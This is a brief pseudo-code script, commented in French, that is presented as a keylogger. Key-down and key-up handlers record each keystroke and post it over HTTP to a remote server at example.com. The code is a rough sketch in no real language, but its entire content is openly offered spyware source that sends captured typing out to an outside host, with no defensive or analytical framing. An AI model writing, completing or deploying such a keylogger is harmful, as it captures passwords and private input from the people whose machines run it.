// Script Klog pour enregistrer les frappes au clavier
// Ce script enregistre les frappes au clavier et les envoie à un serveur distant

// Configuration du serveur distant
server = "http://example.com/log"

// Fonction pour envoyer les données au serveur
sendLog(data) {
    http.post(server, data)
}

// Fonction pour enregistrer les frappes au clavier
onKeyDown(key) {
    // Enregistre la frappe au clavier
    log = "Key pressed: " + key
    sendLog(log)
}

// Fonction pour enregistrer les frappes au clavier
onKeyUp(key) {
    // Enregistre la frappe au clavier
    log = "Key released: " + key
    sendLog(log)
}
